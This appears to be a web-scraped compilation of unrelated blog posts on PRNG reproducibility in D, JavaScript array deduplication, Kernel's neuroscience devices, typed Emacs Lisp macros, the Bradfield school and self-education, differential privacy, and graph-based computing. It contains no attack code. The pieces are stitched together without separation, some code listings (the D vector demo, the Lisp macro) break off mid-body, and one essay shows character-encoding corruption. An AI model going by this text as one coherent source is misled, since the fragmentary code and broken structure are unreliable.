      <p>Pseudorandom number generators (PRNGs) are often treated like a compromise: their output isn’t as good as real
      random number generators, but they’re cheap and easy to use on computer hardware. But a special feature of PRNGs
      is that they’re <em>reproducible</em> sources of random-looking data:</p>
      <figure>
        <pre><code data-lang="d"><span>import</span> <span>std</span><span>.</span><span>random</span><span>;</span>
<span>import</span> <span>std</span><span>.</span><span>stdio</span><span>;</span>

<span>void</span> <span>main</span><span>()</span>
<span>{</span>
    <span>// Seed a PRNG and generate 10 pseudo-random numbers</span>
    <span>auto</span> <span>rng</span> <span>=</span> <span>Random</span><span>(</span><span>42</span><span>);</span>
    <span>foreach</span> <span>(</span><span>_</span><span>;</span> <span>0..10</span><span>)</span> <span>write</span><span>(</span><span>uniform</span><span>(</span><span>0</span><span>,</span> <span>10</span><span>,</span> <span>rng</span><span>),</span> <span>' '</span><span>);</span>
    <span>writeln</span><span>();</span>
    <span>// Reset the PRNG, and the same sequence is generated again</span>
    <span>rng</span> <span>=</span> <span>Random</span><span>(</span><span>42</span><span>);</span>
    <span>foreach</span> <span>(</span><span>_</span><span>;</span> <span>0..10</span><span>)</span> <span>write</span><span>(</span><span>uniform</span><span>(</span><span>0</span><span>,</span> <span>10</span><span>,</span> <span>rng</span><span>),</span> <span>' '</span><span>);</span>
    <span>writeln</span><span>();</span>

    <span>// Output:</span>
    <span>// 2 7 6 4 6 5 0 4 0 3</span>
    <span>// 2 7 6 4 6 5 0 4 0 3</span>
<span>}</span></code></pre>
      </figure>
      <p>This simple fact enables a few neat tricks.</p><p>A couple of famous examples come from the gaming industry. The classic example is the space trading game
      Elite, which was originally written for 8b BBC Micros in the early 80s. It was a totally revolutionary game, but
      just one thing that amazed fans was its complex universe of thousands of star systems. That was something you
      just didn’t normally get in games written for machines with kilobytes of RAM total. The trick was to generate the
      universe with a PRNG seeded with a small value. There was no need to store the universe in memory because the
      game could regenerate each star system on demand, repeatedly and deterministically.</p>
      <p>PRNGs are now widely exploited for recording games for replays. You don’t need to record every frame of the
      game world if you can just record the PRNG seed and all the player actions. (Like most things in software,
      <a href="https://technology.riotgames.com/news/determinism-league-legends-introduction">actually implementing
      that can be surprisingly challenging</a>.)</p>
      <h2 id="random-mappings">Random mappings</h2>
      <p>In machine learning, you often need a mapping from things to highly dimensional random unit vectors (random
      vectors of length 1). Let’s get more specific and say you’re processing documents for topic/sentiment analysis or
      similarity. In this case you’ll generate a random vector for each word in the dictionary. Then you can create a
      vector for each document by adding up the vectors for each word in it (with some kind of weighting scheme, in
      practice). Similar documents will end up with similar vectors, and you can use linear algebra tricks to uncover
      deeper patterns (read about <a href="https://en.wikipedia.org/wiki/Latent_semantic_analysis">latent semantic
      analysis</a> if you’re interested).</p>
      <p>An obvious way to get a mapping between words and random vectors is to just initially generate a vector for
      each word, and create a hash table for looking them up later. Another way is to generate the random vectors on
      demand using a PRNG seeded by a hash of the word. Here’s a toy example:</p>
      <figure>
        <pre><code data-lang="d"><span>/+ dub.sdl:
    name "prngvecdemo"
    dependency "mir-random" version="~&gt;2.2.14"

    <span>}</span>

    <span>writeln</span><span>(</span><span>doc_vec</span><span>);</span>
<span>}</span></code></pre>
      </figure>
      <p>This kind of trick isn’t the answer to everything, but it has some uses. Obviously, it can be useful if you’re
      working with more data than you have RAM (though you might still cache some of the generated data). Another use
      case is processing a large dataset with parallel workers. In the document example, you can get workers to “agree”
      on what the vector for each word should be, without data synchronisation, and without needing to do an initial
      pass over the data to build a dictionary of words. I’ve used this trick with experimental code, just because I
      was too lazy to add an extra stage to the data pipeline. In some applications, recomputing data on the fly can
      even be faster than fetching it from a very large lookup table.</p>
      <h2 id="an-ode-to-xorshift">An ode to Xorshift</h2>
      <p>You might have noticed I used <code>Xoroshiro128Plus</code>, a
      variant of the Xorshift PRNG. The Mersenne Twister is a de facto standard PRNG in some computing fields, but I’m
      a bit of a fan of the Xorshift family. The basic Xorshift engines are fast and pretty good, and there are
      variants that are still fast and have excellent output quality. But the big advantage compared to the Mersenne
      Twister is the state size. The Mersenne Twister uses a pool of 2496 bytes of state, whereas most of the Xorshift
      PRNGs can fit into one or two machine <code>int</code>s.</p>
      <p>The small state size has a couple of advantages for this kind of “on demand” PRNG usage: One is that
      thoroughly initialising a big state from a small seed takes work (some people “warm up” a Mersenne Twister by
      throwing away several of the initial outputs, just to be sure). The second is that the small size of the PRNGs
      makes them cheap enough to use in places you wouldn’t think of using a Mersenne Twister.</p>
      <h2 id="random-data-structures-made-reliable">Random data structures made reliable</h2>
      <p>Some data structures and algorithms use randomisation. An example is a treap, which is a binary search tree
      that uses a randomised heap for balancing. Treaps are much less popular than AVL trees or red-black trees, but
      they’re easier to implement correctly because you end up with fewer edge cases. They’re also good enough for most
      use cases. That makes them a good choice for application-specific “augmented” BSTs. But for argument purposes,
      it’s just a real example of a data structure that happens to use randomness as an implementation detail.</p>
      <p>Randomisation comes with a major drawback: it’s a pain when testing and debugging. Test failures aren’t
      reproducible for debugging if real randomness is used. If you have any experience with testing, you’ll have seen
      this and you’ll know it’s a good idea to use a PRNG instead.</p>
      <p>Using a global PRNG mostly works, but it couples the treaps through one shared PRNG. That accidental coupling
      can lead to test flakes if you’re running several tests at once, unless you’re careful to use one PRNG per thread
      and reset it for every test. Even then you can get Heisenbugs in your non-test code.</p>
      <p>What about dependency injection? Making every treap method require a reference to a PRNG works, but it leaks
      the implementation detail throughout your code. You could make the treap take a reference to a PRNG in its
      constructor, but that implies adding an extra pointer to the data structure. If you’re going to do that, why not
      just make every treap embed its own 32b or 64b Xorshift PRNG? Embedding the PRNG into the treap makes it
      deterministic and reproducible in a way that’s encapsulated and decoupled from everything else.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this blog post, we look at three approaches for eliminating duplicate objects from Arrays.</p>
<!--more-->
<h2 id="eliminating-duplicates-from-arrays">Eliminating duplicates from Arrays&nbsp;&nbsp;</h2>
<p>Eliminating duplicate values from Arrays is simple – as long as the values are primitive (and therefore compared by value):</p>
<pre><code><span>const</span> values = [<span>'jane'</span>, <span>'lars'</span>, <span>'jane'</span>];
<span>const</span> uniqueValues = [...new <span>Set</span>(values)];
assert.deepEqual(
  uniqueValues,
  [<span>'jane'</span>, <span>'lars'</span>]);
</code></pre>
<p>However, that approach doesn’t work with the following data because a Set would consider each object to be unique:</p>
<pre><code><span>const</span> members = [
  {
    <span>first</span>: <span>'Jane'</span>,
    <span>last</span>: <span>'Bond'</span>,
    <span>id</span>: <span>'10yejma'</span>,
  },
  {
    <span>first</span>: <span>'Lars'</span>,
    <span>last</span>: <span>'Croft'</span>,
    <span>id</span>: <span>'1hhs0k2'</span>,
  },
  {
    <span>first</span>: <span>'Jane'</span>,
    <span>last</span>: <span>'Bond'</span>,
    <span>id</span>: <span>'1y15hhu'</span>,
  },
];
</code></pre>
<h2 id="approach-1%3A-building-a-new-array-without-duplicates">Approach 1: building a new Array without duplicates&nbsp;&nbsp;</h2>
<pre><code><span>const</span> uniqueMembers1 = [];

<span>for</span> (<span>const</span> m <span>of</span> members) {
  <span>if</span> (!containsMember(uniqueMembers1, m)) {
    uniqueMembers1.push(m);
  }
}

<span><span>function</span> <span>containsMember</span>(<span>memberArray, member</span>) </span>{
  <span>return</span> memberArray.find(
    <span>(<span>m</span>) =&gt;</span> m.first === member.first &amp;&amp; m.last === member.last);
}

assert.deepEqual(
  uniqueMembers1,
  [
    {
      <span>first</span>: <span>'Jane'</span>,
      <span>id</span>: <span>'10yejma'</span>,
      <span>last</span>: <span>'Bond'</span>,
    },
    {
      <span>first</span>: <span>'Lars'</span>,
      <span>id</span>: <span>'1hhs0k2'</span>,
      <span>last</span>: <span>'Croft'</span>,
    },
  ]);
</code></pre>
<p>We only add an object from <code>members</code> to <code>uniqueMembers1</code> if it doesn’t already exist in that Array. That’s why the earlier Jane with ID <code>'10yejma'</code> “wins”.</p>
<h2 id="approach-2%3A-using-.filter()">Approach 2: using <code>.filter()</code>&nbsp;&nbsp;</h2>
<pre><code>
<span>const</span> uniqueMembers2 = members.filter(
  <span>(<span>m, index, ms</span>) =&gt;</span> getIndexOfMember(ms, m) === index);

<span><span>function</span> <span>getIndexOfMember</span>(<span>memberArray, member</span>) </span>{
  <span>return</span> memberArray.findIndex(
    <span>(<span>m</span>) =&gt;</span> m.first === member.first &amp;&amp; m.last === member.last);
}

assert.deepEqual(
  uniqueMembers2,
  [
    {
      <span>first</span>: <span>'Jane'</span>,
      <span>id</span>: <span>'10yejma'</span>,
      <span>last</span>: <span>'Bond'</span>,
    },
    {
      <span>first</span>: <span>'Lars'</span>,
      <span>id</span>: <span>'1hhs0k2'</span>,
      <span>last</span>: <span>'Croft'</span>,
    },
  ]);
</code></pre>
<p><code>getIndexOfMember()</code> returns the first index where a member appears. We tell <code>.filter()</code> to only keep the members at those indices. That’s why the first Jane “wins”.</p>
<h2 id="approach-3%3A-a-map-from-unique-keys-to-members">Approach 3: a Map from unique keys to members&nbsp;&nbsp;</h2>
<pre><code>
<span>const</span> uniqueKeyToMember = <span>new</span> <span>Map</span>(
  members.map(<span><span>m</span> =&gt;</span> [m.first+<span>'\t'</span>+m.last, m])); 
<span>const</span> uniqueMembers3 = [...uniqueKeyToMember.values()];

assert.deepEqual(
  uniqueMembers3,
  [
    {
      <span>first</span>: <span>'Jane'</span>,
      <span>id</span>: <span>'1y15hhu'</span>,
      <span>last</span>: <span>'Bond'</span>,
    },
    {
      <span>first</span>: <span>'Lars'</span>,
      <span>id</span>: <span>'1hhs0k2'</span>,
      <span>last</span>: <span>'Croft'</span>,
    },
  ]);
</code></pre>
<p>If an object that is added to the Map has the same unique key as a previous object, it replaces that object. That’s why the later Jane with ID <code>'1y15hhu'</code> “wins”.</p>
<h3 id="variants-of-approach-1-and-approach-2">Variants of approach 1 and approach 2&nbsp;&nbsp;</h3>
<p>We use a Set to record unique keys of members that we have visited. If the key of the current member is already in that Set, then we don’t push it (approach 1) or filter it out (approach 2).</p>
<p>This may help with large Arrays because we don’t have to search them. On the other hand, creating keys and maintaining a Set affects performance negatively.</p>

                    <p>Kernel, a start-up claiming to offer “Neuroscience as a Service” has been in the news lately because of their recently announced $53M Series C fund raising. What hasn’t been as widely covered is what their services are and how they work.</p><p>Fortunately Kernel has published a fairly <a href="https://www.kernel.co/hello-humanity">extensive breakdown</a> of their research and the resulting products they plan to bring to market. Kernel is focused on measuring signals in the brain to better understand the brain and advance neuroscience more quickly, eventually hoping to be able to read and write cognition. Traditional tools for measuring brain activity like functional Magnetic Resonance Imaging fMRI and Electroencephalography &nbsp;(EEG) are costly, bulky and difficult to use in real-life situations that would produce more meaningful data.</p><p>To solve this problem, Kernel has developed two different technologies for measuring brain activity it calls Flow and Flux, which it hopes will scale our understanding of the human brain, leading to advances in brain health and overall brain performance to name just a few potential benefits. Kernel believes that using both technologies in conjunction will result in even faster advances in how brain activity is measured.</p><p>Kernel Flow is a technology for measuring hemodynamics, that is the flow of blood, in the brain. This is similar to an FMRI, only without needing the patient to lie perfectly still in a room-sized machine. Flow by contrast is a wearable headset which allows the wearer to engage in normal activities, and the data is processed in a connected computer (currently tethered via USB, though wireless data transfer certainly seems feasible given the relative transfer rates of USB and WiFi standards).</p><p>Kernel Flux uses advanced devices that measure magnetic fields called optically pumped magnetometers or OPMs, while still allowing the subject to move their head normally and comfortably. The flux system is also able to distinguish background magnetic fields not coming from the subject (such as the magnetic fields created by power lines or other parts of the human body) and filter them out, resulting in a higher signal to noise ratio.</p><p>Kernel detailed two experiments to demonstrate the fidelity of its neural activity measurements, “Speller” and “Speak ID.” Both experiments described seem to have been based on the ideas that led to its Kernel Flux technology.</p><p>In the Speller experiment, subjects were shown 30, eight-letter words (240 total letters), and asked to spell each word after it was displayed by looking at a visual keyboard. Using 20 OPMs, placed on the subjects head, the researchers were able to measure the brain waves of the participants, then run them through a statistical method known as canonical correlation analysis (CCA). With this analysis, the researchers were able to correctly predict which letter the subject was looking at an average of 80% of the time. In subsequent experiments, they were able to nearly reproduce the performance of 20 sensors using only 4 sensors.</p><p>The Sound ID experiment used 16 OPM sensors again placed on the heads of the subjects, while the subject selected 60 second snippets of recorded speech. Again using CCA analysis on the real-time data fed from the sensors the researchers were able to determine which snippet the subject was listening to with 100% accuracy in most cases in under 20 seconds. The experiment was also run using snippets of songs instead of speech, and while the results were less accurate and predictions took longer, they were able to predict 8 out of 10 songs correctly in some subjects.</p><p>Kernel has promised to share results from their Flow and Flux hardware soon. Until then, we'll be wondering what new insights might be gleaned from these novel ways of collecting data directly from the brain. </p>

July 17, 2020 | https://alhassy.github.io/TypedLisp.html | <a href="https://web.archive.org/web/*/https://alhassy.github.io/TypedLisp.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="text-typing-via-macros">
<p>
Checking the type of inputs is tedious and so I <a href="https://www.reddit.com/r/emacs/comments/cct5hp/functional_type_declarations_in_elisp/">guessed</a> it could be done using
macros and advice. Looking at <a href="https://docs.racket-lang.org/ts-guide/types.html">Typed Racket</a> for inspiration, the following
fictitious syntax would add advice to <code>f</code> that checks the optional arguments <code>xᵢ</code>
have type <code>σᵢ</code> and the mandatory positional arguments have type <code>τᵢ</code> according
to position, and the result of the computation is of type <code>τ</code>.
To the best of my knowledge, no one had done this for Emacs Lisp —I don't know why.
</p>
<div>
<pre>(declare-type 'f ((<span>:x₁</span> σ₁) … (<span>:xₘ</span> σₘ)) (τ₁ … τₙ τ))
</pre>
</div>

<p>
To modify a variable, or function, we may simply redefine it; but a much more elegant and powerful
approach is to <a href="https://www.gnu.org/software/emacs/manual/html_node/elisp/Advising-Functions.html">“advise”</a> the current entity with some new behaviour. In our case of interest, we will
<i>advise functions to check their arguments before executing their bodies</i>.
</p>

<p>
Below is my attempt: <a id="org84d2c90"><code>declare-type</code></a>. Before you get scared or think it's horrendous, be charitable and
note that about a third of the following is documentation and a third is local declarations.
</p>
<div>
<pre>(<span>cl-defmacro</span> <span>declare-type</span> (f key-types <span>&amp;rest</span> types)
  <span>"Attach the given list of types to the function ‘f’</span>
<span>   by advising the function to check its arguments’ types</span>
<span>   are equal to the list of given types.</span>

<span>   We name the advice ‘⟪f⟫-typing-advice’ so that further</span>
<span>   invocations to this macro overwrite the same advice function</span>
<span>   rather than introducing additional, unintended, constraints.</span>

<span>   Using type specifiers we accommodate for unions of types</span>
<span>   and subtypes, etc ♥‿♥.</span>

<span>   ‘</span><span>key-types</span><span>’ should be of the shape (:x₀ t₀ ⋯ :xₙ tₙ);</span>
<span>    when there are no optional types, use symbol “:”.</span>

<span>    E.g., (declare-type my-func (:z string :w integer) integer symbol string)</span>
<span>  "</span>

  <span>;; </span><span>Basic coherency checks. When there aren't optional types, key-types is the “:” symbol.</span>

<p>
There are some notable shortcomings: Lack of support for type variables and, for now, no support for
optional arguments. Nonetheless, I like it —of course.
( Using <a href="https://www.gnu.org/software/emacs/manual/html_node/elisp/Watching-Variables.html#Watching-Variables">variable watchers</a> we could likely add support for type variables as well as
function-types. )

The type declaration said we needed 3 arguments, but we did not consider one of them.

<p>
Notice: When multiple positional arguments have type-errors, the errors are reported one at a time.

Given an integer greater than 5, we present an integer greater than 2; i.e.,
this is a constructive proof that \(∀ n • n &gt; 5 ⇒ n &gt; 2\).
</p>
<div>
<pre>(declare-type f₈ : (satisfies (<span>lambda</span> (in)  (<span>&gt;</span> in 5)))
                   (satisfies (<span>lambda</span> (out) (<span>&gt;</span> out 2))))
(<span>cl-defun</span> <span>f₈</span> (n) n)
<span>;; </span><span>The identity on 5 function; and undefined otherwise.</span>

(f₈ 4)
<span>;; </span><span>⇒  f₈: Type mismatch! Expected (satisfies (lambda (in) (&gt; in 5))) for argument 0</span>
<span>;;        </span><span>≠ Given integer 4.</span>

(f₈ 72) <span>;; </span><span>⇒ 72; since indeed 72 &gt; 5 for the input, and clearly 72 &gt; 2 for the output.</span>
</pre>
</div>

<p>
As it currently stands we cannot make any explicit references between the inputs
and the output, but that's an easy fix: Simply add a local function <code>old</code> to the
<a href="#org84d2c90"><code>declare-type</code></a> macro which is intentionally exposed so that it can be used in the
type declarations to refer to the ‘old’, or initial, values provided to the function.
Additionally, one could also add keyword arguments <code>:requires</code> and <code>:ensures</code>
for a more sophisticated pre- and post-condition framework.
<a href="https://github.com/sellout/quid-pro-quo">Something</a> along these lines is implemented for Common Lisp.
</p>

<p>
Here's a fun exercise: Recast the <a href="https://liquid.kosmikus.org/01-intro.html#/what-is-liquid-haskell">Liquid Haskell</a> examples in Lisp using this
<a href="#org84d2c90"><code>declare-type</code></a> form.

      <h2><strong>Reinvention as Subversive Activity</strong></h2>

<p>
I woke up to the sound of waves in the Outer Sunset.
</p>

<p>
I rode my bike crosstown to that bright red door in SoMa. That dreadful, joyful, awful, inspiring red door.
</p>

<p>
An eerie calm came over me one morning as I whizzed by the eastbound N. Judah bus heading downtown. Big realizations happen in small moments expertly placed.
</p>

<p>
You see, every day behind that red door, five of us wandering souls congregated. We dodged the morning glory of San Franciscoâ€™s shit and piss to enter the path of mastery.
</p>

<p>
We immersed ourselves in an experiment that I now realize is the future of education. Our fearless leaders in computer science, Oz and Myles, treated us as their apprentices.
</p>

<p>
Every day was an active-yet-still journey. One hour of instruction. A full day of building subsets of various popular technologies, from scratch.
</p>

<p>
<em>Calm practice.</em>
</p>

<p>
We were accustomed to frantic practice - college taught us to treat knowledge as something disembodied from us, as if it were something to drink up, consume, cram. We were thirsty, so our college professors tried to quench us with dusty slides on overhead projectors.
</p>

<p>
I struggled with calm practice. It didnâ€™t let me hide. Oz and Myles insisted that there is no knowledge without fundamental understanding. As we wrote our programs, Oz would ask us:
</p>

<p>
â€œLet me see your understanding.â€�
</p>

<p>
So we had to show our work. Our hand scribbles, our test cases, our questions, our explanations, our exposition, our diagrams.
</p>

<p>
Some days, my monkey mind hated this relentless pursuit of understanding. I would grow frustrated by my lack of skills. Iâ€™d hack together a program that barely worked.
</p>

<p>
Oz had a sixth sense for this. On this day, noticing my frustration, he came over to me and placed an Albert Einstein bobblehead next to my laptop.
</p>

<p><img src="https://ammarmian.com/img/einstein.png" alt="Einstein bobblehead"></p><p>
The calm yet unending repetition of Albertâ€™s finger touching forehead reminded me: â€œJust think. Itâ€™s all in there.â€�
</p>

<p>
I wish I could say I was enlightened on the spot. Instead I silently told Oz to go fuck himself, and he chuckled and walked away.
</p>

<h3>
Old School, New School
</h3>

<p>
This was my experience as part of the first experimental cohort of the Bradfield School of Computer Science. In 6 months of studying with Oz and Myles, I learned more than I ever had from regurgitating textbook concepts for exams.
</p>

<p>
My time at Bradfield set me on a path to discover education continuously from the experts all around me. That sounds so obvious, but I always thought I needed permission to learn. I thought education was something static that I acquired once and never needed to think about again.
</p>

<p>
What I didn't understand: our economy was built for static expertise. Go to college, gain credentials, and youâ€™ll be set for the rest of your life. Take a course or a workshop, and ride the certification train to a raise or promotion.
</p>

<p>
Our world is anything but static. Technology, business innovation, and social movements have changed the landscape in a radical way. Your economics and political science degree doesnâ€™t prepare you for what you need to know in the world. Even your technical degree or advanced credential doesnâ€™t quite prepare you.
</p>

<p>
We are by and large using Old World tactics to navigate the New World. The rules have changed.
</p>

<p>
<strong>Old World</strong>: unflagging economic growth, rapid job creation, government-subsidized education, big companies offering long careers, ordinary Americans taking out low-interest loans from local banks.
</p>

<p>
<strong>New World</strong>: rapid digital automation of jobs and mass layoffs, high education costs, stagnant economic growth, ordinary Americans mired in all sorts of debt.
</p>

<p>
The existing institutions gave us the paternalistic comfort that they understood what was going on. Only they could teach you what you need to learn to succeed in the world.
</p>

<p>
These institutions no longer play that role. We donâ€™t trust these institutions as much as we used to. This is a healthy stance.
</p>

<p>
<strong>Old School</strong>: packaged, exam-based, lecturer-led, synchronous, passive and isolated, credential-oriented.
</p>

<p>
<strong>New School</strong>: a la carte, project-based, practitioner-led, asynchronous, immersive and collaborative, accomplishment-oriented.
</p>

<p>
Legacy institutions are now scrambling to keep up with new forms of education that are emerging around us. These new forms are bootcamps, intensive trade schools, online courses provided directly by masters of the craft, live screencasts and videos.
</p>

<p>
<strong>Old Mind</strong>: passively receive instruction, memorize concepts, take lecture notes, cram for the exam, and receive a grade not directly tied to accomplishment.
</p>

<p>
<strong>New Mind</strong>: actively engage with instruction, play and reconfigure concepts, shadow the practitioner, and gauge understanding through direct accomplishment.
</p>

<p>
This is all really exciting stuff. The New Mind is going to be the biggest differentiator in the modern world for years to come. The New Mind learns differently. Yet we are still entering these new education forms with the Old Mind.
</p>

<h3>
Old Mind, New Mind
</h3>

<p>
You see, the New School requires the New Mind. The New Mind is very much like the mind of our heroes of antiquity, the Montaignes and Spinozas and Galileos, the autodidacts fashioning their own educations through apprenticeship and self-discovery.
</p>

<p>
The new is the old made fashionable again. The old had never left, it had just gone into hiding, waiting for a worthy society to rediscover it. We are a worthy society, and we have rediscovered The New Mind.
</p>

<p>
Itâ€™s the teacher pointing at the bobblehead.
</p>

<p>
Itâ€™s the bobbleheadâ€™s finger pointing at its head.
</p>

<p>
Itâ€™s the whole situation reminding you that you have all the tools to reinvent yourself.
And reinvention is how you subvert The Old Mind. This subversion reveals The New Mind that you possessed all along.
</p>

<hr>
<p><span>A</span><strong>re</strong> you following tech- or privacy-related
news? If so, you might have heard about <em>differential privacy</em>. The concept is
popular both in academic circles and inside tech companies. Both <a href="https://www.wired.com/2016/06/apples-differential-privacy-collecting-data/">Apple</a> or
<a href="https://security.googleblog.com/2014/10/learning-statistics-with-privacy-aided.html">Google</a> use differential privacy to collect data in a private way.</p>
<p>So, what's this definition about? How is it better than <a href="https://desfontain.es/privacy/k-anonymity.html">definitions</a>  <a href="https://desfontain.es/privacy/k-map.html">that</a>  <a href="https://desfontain.es/privacy/l-diversity.html">came</a>  <a href="https://desfontain.es/privacy/delta-presence.html">before</a>?
More importantly, why should you care? What makes it so exciting to researchers
and tech companies? In this post, I'll try to explain the idea behind
differential privacy and its advantages. I'll do my best to keep it simple and
accessible for everyone&nbsp;—&nbsp;not only technical folks.</p>

<p>This process can be <em>anything</em>. For example, it can be:</p>
<ul>
<li>computing some statistic ("tell me how many users have red hair")</li>
<li>an anonymization strategy ("remove names and last three digits of ZIP codes")</li>
<li>a machine learning training process ("build a model to predict which users
  like cats")</li>
<li>… you get the idea.</li>
</ul>
<p>To make a process differentially private, you usually have to modify it a little
bit. Typically, you add some randomness, or <em>noise</em>, in some places. What
exactly you do, and how much noise you add, depends on which process you're
modifying. I'll abstract that part away and simply say that your process is now
doing some unspecified ✨&nbsp;magic&nbsp;✨.</p>

<p>By "basically the same", I don't mean "it looks a bit similar". Instead,
remember that the magic you added to the process was <em>randomized</em>. You don't
always get the same output if you run the new process several times. So what
does "basically the same" means in this context? That the <em>probability
distributions</em> are similar. You can get the <em>exact same</em> output with database 1
or with database 2, with similar likelihood.</p>
<p>What does this have to do with privacy? Well, suppose you're a creepy person
trying to figure out whether your target is in the original data. By looking at
the output, you can't be 100% certain of anything. Sure, it could have come from
a database with your target in it. But it could also have come from the exact
same database, without your target. Both options have a similar probability, so
there's not much you can say.</p>
<p>You might have noticed that this definition is not like the ones we've seen
before. We're not saying that the output data satisfies differential privacy.
We're saying that the <em>process</em> does. This is very different from <span>\(k\)</span>-anonymity
and other definitions we've seen. There is no way to look at data and determine
whether it satisfies differential privacy. You have to know the <em>process</em> to
know whether it is "anonymizing" enough.</p>
<p>And that's about it. It's a tad more abstract than other definitions we've seen,
but not that complicated. So, why all the hype? What makes it so awesome
compared to older, more straightforward definitions?</p>

<p>Privacy experts, especially in academia, are enthusiastic about differential
privacy. It was first proposed by Cynthia Dwork, Frank McSherry, Kobbi Nissim
and Adam Smith in 2006<sup id="fnref:papers"><a href="#fn:papers" rel="footnote">1</a></sup>. Very soon, almost all researchers working on
anonymization started building differentially private algorithms. And, as we've
already mentioned, tech companies are also trying to use it whenever possible.
So, why all the hype? I can count three main reasons.</p>
<h2 id="you-no-longer-need-attack-modeling">You no longer need attack modeling</h2>
<p>Remember the previous definitions we've seen? (If not, you're fine, just take my
word for it&nbsp;:D) Why did we need <a href="https://desfontain.es/privacy/k-map.html"><span>\(k\)</span>-map</a> in certain cases, and
<a href="https://desfontain.es/privacy/k-anonymity.html"><span>\(k\)</span>-anonymity</a> or <a href="https://desfontain.es/privacy/delta-presence.html"><span>\(\delta\)</span>-presence</a> in others? To choose the right one,
we had to figure out the attacker's <em>capabilities</em> and <em>goals</em>. In practice,
this is pretty difficult. You might not know exactly what your attacker is
capable of. Worse, there might be <em>unknown unknowns</em>: attack vectors that you
hadn't imagined at all. You can't make very broad statements when you use
old-school definitions. You have to make some assumptions, which you can't be
100% sure of.</p>
<p>By contrast, when you use differential privacy, you get two awesome guarantees.</p>
<ol>
<li>You protect <em>any kind of information about an individual</em>. It doesn't matter
   what the attacker wants to do. Reidentify their target, know if they're in
   the dataset, deduce some sensitive attribute… All those things are protected.
   Thus, you don't have to think about the goals of your attacker.</li>
<li>It works <em>no matter what the attacker knows about your data</em>. They might
   already know some people in the database. They might even add some fake users
   to your system. With differential privacy, it doesn't matter. The users that
   the attacker doesn't know are still protected.</li>
</ol>
<h2 id="you-can-quantify-the-privacy-loss">You can quantify the privacy loss <a name="quantify"></a></h2>
<p>We saw that when using <span>\(k\)</span>-anonymity, <a href="https://desfontain.es/privacy/k-anonymity.html#how-to-choose-k">choosing the parameter</a> <span>\(k\)</span> is pretty
tricky. There is no clear link between which <span>\(k\)</span> to choose and how "private" the
dataset is. The problem is <a href="https://desfontain.es/privacy/l-diversity.html#the-bad-news-policy">even worse</a> with other definitions. This problem is
present in all other definitions we've seen so far.</p>
<p>Differential privacy is much better. When you use it, you can quantify the
<em>greatest possible information gain</em> by the attacker. The corresponding
parameter, usually named <span>\(\varepsilon\)</span>, allows you to make very strong statements.
Suppose <span>\(\varepsilon=1.1\)</span>. Then, you can say: "an attacker who thinks their target
is in the dataset with probability 50% can increase their level of certainty to
at most 75%."</p>
<p>And do you remember the previous point about attack modeling? It means you can
change this statement in many ways. You can replace "their target is is the
dataset" by anything about one individual. And you can add "no matter what the
attacker knows" if you want to be extra-precise. Altogether, that makes
differential privacy much stronger than all definitions that came before.</p>
<h2 id="you-can-compose-multiple-mechanisms">You can compose multiple mechanisms <a name="composition"></a></h2>
<p>Suppose you have some data. You want to share it with Alex and with Brinn, in
some anonymized fashion. You trust Alex and Brinn equally, so you use the same
definition of privacy for both of them. They are not interested in the same
aspects of the data, so you give them two different versions of your data. Both
versions are "anonymous", for the definition you've chosen.</p>
<p>What happens if Alex and Brinn decide to conspire, and compare the data you gave
them? Will the union of the two anonymized versions still be anonymous? It turns
out that for most definitions of privacy, this is not the case. If you put two
<span>\(k\)</span>-anonymous versions of the same data together, the result won't be
<span>\(k\)</span>-anonymous. So if Alex and Brinn conspire, they might be able to reidentify
users on their own… or even reconstruct all the original data! That's definitely
not good news.</p>
<p>If you used differential privacy, you get to avoid this type of scenario.
Suppose that you gave differentially private data to Alex and Brinn. Each time,
you used a parameter of <span>\(\varepsilon\)</span>. Then if they conspire, the resulting data
is still protected by differential privacy, except that the privacy is now
weaker: the parameter becomes <span>\(2\varepsilon\)</span>. So they gain something, but you
still quantify how much information they got. Privacy experts call this property
<em>composition</em>.</p>
<p>This scenario sounds a bit far-fetched, but composition is super useful in
practice. Organizations often want to do many things with data. Publish
statistics, release an anonymized version, train machine learning algorithms…
Composition is a way to stay in control of the level of risk as new use cases
appear and processes evolve.</p>

<p>I hope the basic intuition behind differential privacy is now clear. Want a
one-line summary? Uncertainty in the process means uncertainty for the attacker,
which means better privacy.</p>
<p>I also hope that you're now wondering <em>how it actually works</em>! What hides behind
this magic that makes everything private and safe? Why does differential privacy
have all the awesome properties I've mentioned? What a coincidence! That's the
topic of a <a href="https://desfontain.es/privacy/differential-privacy-in-more-detail.html">follow-up article</a>, which tries to give more details while still
staying clear of heavy math.</p>

  <p><span>30 Jun 2020</span></p><p>Research has begun to reveal many algorithms can be expressed as matrix multiplication, suggesting an unrealized connection between linear algebra and computer science. I speculate graphs are the missing piece of the puzzle. Graphs are not only useful as cognitive aides, but are suitable data structures for a wide variety of tasks, particularly on modern parallel processing hardware.</p>

<p>In this essay, I explore the virtues of graphs, algebra, types, and show how these concepts can help us reason about programs. I propose a computational primitive based on graph signal processing, linking software engineering, graphs, and linear algebra. Finally, I share my predictions for the path ahead, which I consider to be the start of an exciting new chapter in computing history.</p>

<p>Over the last decade, I bet on some strange ideas. A lot of people I looked up to at the time laughed at me. I’ll bet they aren’t laughing anymore. I ought to thank them one day, because their laughter gave me a lot of motivation. I’ve said some idiotic things to be sure, but I’ve also made some laughable predictions that were correct. Lesson learned: aim straighter.</p>

<p>In 2012, I was in Austin sitting next to an ex-poker player named <a href="https://twitter.com/amirpc">Amir</a> who was singing Hinton’s praises. Hypnotized by his technicolor slides, I quit my job in a hurry and started an educational project using speech recognition and restricted Boltzmann machines. It never panned out, but I learned a lot about ASR and Android audio. Still love <a href="http://breandan.net/2014/02/09/the-end-of-illiteracy/">that idea</a>.</p>

<p>In 2017, I started writing a book on the ethics of automation and <a href="http://breandan.net/2017/02/02/trust-in-automation/">predicted</a> mass unemployment and social unrest. Although I got the causes wrong (pandemic, go figure), the information economy and confirmation bias takes were all dead right. Sadly, this is now driving the world completely insane. Don’t say I warned you, go out and fix our broken systems. The world needs more engineers who care.</p>

